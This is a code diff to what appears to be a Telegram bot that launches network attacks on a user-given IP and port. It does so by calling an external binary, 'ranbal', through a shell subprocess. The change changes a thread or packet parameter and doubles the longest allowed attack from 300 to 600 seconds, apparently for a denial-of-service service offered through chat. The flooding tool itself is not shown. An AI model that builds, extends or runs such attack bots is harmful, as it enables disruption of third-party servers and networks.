@@ -134,7 +134,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./ranbal {ip} {port} {duration} 1000"
+        command = f"./ranbal {ip} {port} {duration} 900"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
@@ -177,8 +177,8 @@ async def attack(update: Update, context: CallbackContext):
     ip, port, duration = args
     try:
         duration = int(duration)
-        if duration > 300:
-            response = "*⚠️ Error: Time interval must be less than or equal to 300 seconds.*"
+        if duration > 600:
+            response = "*⚠️ Error: Time interval must be less than or equal to 600 seconds.*"
             await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
             return
     except ValueError:
